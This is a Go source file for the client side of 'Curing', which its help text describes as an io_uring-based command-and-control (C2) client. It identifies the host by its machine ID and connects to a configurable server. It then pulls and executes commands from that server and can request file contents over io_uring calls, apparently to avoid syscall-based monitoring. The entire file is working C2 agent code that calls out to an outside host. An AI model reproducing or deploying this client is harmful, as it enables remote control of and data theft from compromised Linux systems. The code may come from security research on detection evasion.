//go:build linux

package main

import (
	"bufio"
	"context"
	"encoding/gob"
	"flag"
	"fmt"
	"log"
	"log/slog"
	"net"
	"os"
	"os/signal"
	"strings"
	"syscall"

	"github.com/amitschendel/curing/pkg/client"
	"github.com/amitschendel/curing/pkg/common"
	"github.com/amitschendel/curing/pkg/config"
	"github.com/iceber/iouring-go"
)

func main() {
	// Parse command line flags
	interactive := flag.Bool("interactive", false, "Run in interactive mode for file reading")
	serverHost := flag.String("host", "", "Server host/IP address (overrides config file)")
	serverPort := flag.Int("port", 0, "Server port (overrides config file)")
	configFile := flag.String("config", "cmd/config.json", "Path to config file")
	help := flag.Bool("help", false, "Show help message")

	flag.Parse()

	if *help {
		fmt.Println("Curing Client - io_uring based C2 client")
		fmt.Println("Usage:")
		flag.PrintDefaults()
		fmt.Println("\nExamples:")
		fmt.Println("  ./client                                    # Use default config")
		fmt.Println("  ./client -interactive                       # Interactive file reader mode")
		fmt.Println("  ./client -host 192.168.1.100 -port 9999   # Connect to remote server")
		fmt.Println("  ./client -interactive -host 10.0.0.5      # Interactive mode with custom host")
		fmt.Println("  ./client -config /path/to/config           # Use custom config file")
		os.Exit(0)
	}

	if *interactive {
		runInteractiveClient(*configFile, *serverHost, *serverPort)
		return
	}

	ctx := context.Background()

	// Get the agent ID from the machine-id file
	agentID, err := os.ReadFile("/etc/machine-id")
	if err != nil {
		log.Fatal(err)
	}

	// Load the configuration
	cfg, err := config.LoadConfig(*configFile)
	if err != nil {
		log.Fatalf("Failed to load config file: %v", err)
	}
	cfg.AgentID = strings.TrimSpace(string(agentID))

	// Override config with command line arguments
	if *serverHost != "" {
		cfg.Server.Host = *serverHost
	}
	if *serverPort != 0 {
		cfg.Server.Port = *serverPort
	}

	// Validate configuration
	if cfg.Server.Port <= 0 || cfg.Server.Port > 65535 {
		log.Fatalf("Invalid server port: %d (must be 1-65535)", cfg.Server.Port)
	}
	if cfg.Server.Host == "" {
		log.Fatal("Server host cannot be empty")
	}

	fmt.Printf("Connecting to server: %s:%d\n", cfg.Server.Host, cfg.Server.Port)

	// Create the executer
	commandExecuter, err := client.NewExecuter(ctx, 10)
	if err != nil {
		log.Fatal(err)
	}

	// Create the command puller
	puller, err := client.NewCommandPuller(cfg, ctx, commandExecuter)
	if err != nil {
		log.Fatal(err)
	}

	// Start both components
	go commandExecuter.Run()
	go puller.Run()

	// Wait for shutdown signal
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	<-sigChan

	// Cleanup
	puller.Close()
	commandExecuter.Close()
}

type InteractiveClient struct {
	cfg        *config.Config
	ring       *iouring.IOURing
	resultChan chan iouring.Result
}

func NewInteractiveClient(cfg *config.Config) (*InteractiveClient, error) {
	ring, err := iouring.New(32)
	if err != nil {
		return nil, err
	}

	return &InteractiveClient{
		cfg:        cfg,
		ring:       ring,
		resultChan: make(chan iouring.Result, 32),
	}, nil
}

func (ic *InteractiveClient) Close() {
	if ic.ring != nil {
		ic.ring.Close()
	}
	close(ic.resultChan)
}

func (ic *InteractiveClient) connectToServer() (int, error) {
	sockfd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)
	if err != nil {
		return -1, err
	}

	request, err := iouring.Connect(sockfd, &syscall.SockaddrInet4{
		Port: ic.cfg.Server.Port,
		Addr: func() [4]byte {
			var addr [4]byte
			copy(addr[:], net.ParseIP(ic.cfg.Server.Host).To4())
			return addr
		}(),
	})
	if err != nil {
		syscall.Close(sockfd)
		return -1, err
	}

	if _, err := ic.ring.SubmitRequest(request, ic.resultChan); err != nil {
		syscall.Close(sockfd)
		return -1, err
	}

	result := <-ic.resultChan
	if result.Err() != nil {
		syscall.Close(sockfd)
		return -1, result.Err()
	}

	slog.Info("Connected to server", "sockfd", sockfd)
	return sockfd, nil
}

func (ic *InteractiveClient) closeConnection(fd int) error {
	request := iouring.Close(fd)
	if _, err := ic.ring.SubmitRequest(request, ic.resultChan); err != nil {
		return err
	}

	result := <-ic.resultChan
	if result.Err() != nil {
		return result.Err()
	}

	slog.Info("Closed connection", "fd", fd)
	return nil
}

func (ic *InteractiveClient) sendFileReadRequest(fd int, filePath string) (*common.Result, error) {
	// Create UringRWer
	urw := &UringRWer{
		fd:         fd,
		resultChan: ic.resultChan,
		ring:       ic.ring,
	}

	// Send file read request
	req := &common.Request{
		AgentID:  ic.cfg.AgentID,
		Type:     common.ReadFileRequest,
		FilePath: filePath,
	}

	encoder := gob.NewEncoder(urw)
	if err := encoder.Encode(req); err != nil {
		return nil, fmt.Errorf("failed to encode request: %w", err)
	}

	// Read response
	decoder := gob.NewDecoder(urw)
	var result common.Result
	if err := decoder.Decode(&result); err != nil {
		return nil, fmt.Errorf("failed to decode result: %w", err)
	}

	return &result, nil
}

type UringRWer struct {
	fd         int
	resultChan chan iouring.Result
	ring       *iouring.IOURing
}

func (urw *UringRWer) Read(buf []byte) (int, error) {
	request := iouring.Read(urw.fd, buf)
	if _, err := urw.ring.SubmitRequest(request, urw.resultChan); err != nil {
		return -1, err
	}

	result := <-urw.resultChan
	if result.Err() != nil {
		return -1, result.Err()
	}

	n := result.ReturnValue0().(int)
	readBuf, _ := result.GetRequestBuffer()
	// Copy the data into the provided buffer
	copy(buf[:n], readBuf[:n])

	return n, nil
}

func (urw *UringRWer) Write(buf []byte) (int, error) {
	request := iouring.Write(urw.fd, buf)
	if _, err := urw.ring.SubmitRequest(request, urw.resultChan); err != nil {
		return -1, err
	}

	result := <-urw.resultChan
	if result.Err() != nil {
		return -1, result.Err()
	}

	n := result.ReturnValue0().(int)
	return n, nil
}

func runInteractiveClient(configFile, serverHost string, serverPort int) {
	// Get the agent ID from the machine-id file
	agentID, err := os.ReadFile("/etc/machine-id")
	if err != nil {
		log.Fatal(err)
	}

	// Load the configuration
	cfg, err := config.LoadConfig(configFile)
	if err != nil {
		log.Printf("Warning: Could not load config file (%v), using defaults", err)
		cfg = &config.Config{
			Server: config.ServerDetails{
				Host: "localhost",
				Port: 8888,
			},
		}
	}
	cfg.AgentID = strings.TrimSpace(string(agentID))

	// Override config with command line arguments
	if serverHost != "" {
		cfg.Server.Host = serverHost
	}
	if serverPort != 0 {
		cfg.Server.Port = serverPort
	}

	// Validate configuration
	if cfg.Server.Port <= 0 || cfg.Server.Port > 65535 {
		log.Fatalf("Invalid server port: %d (must be 1-65535)", cfg.Server.Port)
	}
	if cfg.Server.Host == "" {
		log.Fatal("Server host cannot be empty")
	}

	// Create interactive client
	client, err := NewInteractiveClient(cfg)
	if err != nil {
		log.Fatal(err)
	}
	defer client.Close()

	fmt.Println("Curing Interactive File Reader")
	fmt.Println("==============================")
	fmt.Printf("Connected to server: %s:%d\n", cfg.Server.Host, cfg.Server.Port)
	fmt.Println("Enter file paths to read (or 'quit' to exit):")

	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print("> ")
		if !scanner.Scan() {
			break
		}

		input := strings.TrimSpace(scanner.Text())
		if input == "" {
			continue
		}

		if input == "quit" || input == "exit" {
			fmt.Println("Goodbye!")
			break
		}

		// Connect to server
		fd, err := client.connectToServer()
		if err != nil {
			fmt.Printf("Error connecting to server: %v\n", err)
			continue
		}

		// Send file read request
		result, err := client.sendFileReadRequest(fd, input)
		if err != nil {
			fmt.Printf("Error sending request: %v\n", err)
			client.closeConnection(fd)
			continue
		}

		// Display result
		if result.ReturnCode == 0 {
			fmt.Printf("\n--- Content of %s ---\n", input)
			fmt.Printf("%s\n", string(result.Output))
			fmt.Printf("--- End of %s ---\n\n", input)
		} else {
			fmt.Printf("Error reading file: %s\n", string(result.Output))
		}

		// Close connection
		client.closeConnection(fd)
	}
}
